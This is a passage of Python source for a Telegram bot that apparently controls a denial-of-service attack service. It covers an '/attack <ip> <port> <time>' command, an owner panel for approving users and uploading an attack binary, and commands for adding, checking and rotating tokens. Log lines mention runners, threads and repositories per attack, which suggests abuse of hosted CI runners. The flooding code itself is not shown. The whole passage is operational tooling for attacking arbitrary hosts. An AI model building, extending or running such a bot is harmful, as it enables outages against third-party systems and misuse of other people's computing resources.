        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "attack_help":
            await query.edit_message_text(
                "⚡ LAUNCH STRIKE\n\n"
                "/attack <ip> <port> <time>\n\n"
                "Example: /attack 1.1.1.1 443 60\n"
                f"Max repos: {MAX_REPOS_PER_ATTACK}",
                parse_mode='HTML'
            )
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop":
            await stop_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("🧹 Check", callback_data="admin_checktokens")],
                [InlineKeyboardButton("🔄 Rotate", callback_data="admin_rotate")],
            ]
            await query.edit_message_text("🔧 ADMIN PANEL", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            await users_cmd(update, context)
        elif data == "admin_pending":
            await pending_cmd(update, context)
        elif data == "admin_binary":
            await query.edit_message_text("📤 Use /binary_upload", parse_mode='HTML')
        elif data == "admin_checktokens":
            await checktokens_cmd(update, context)
        elif data == "admin_rotate":
            await rotatetokens_cmd(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ System glitch. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("rotate", rotatetokens_cmd))
        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("🚀 ARMADA ONLINE – SEXY EDITION")
        logger.info(f"⚙️ {min(RUNNERS_PER_ATTACK, 15)} Runners × {THREADS_PER_RUNNER} Threads")
        logger.info(f"📦 Max {MAX_REPOS_PER_ATTACK} Repos")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
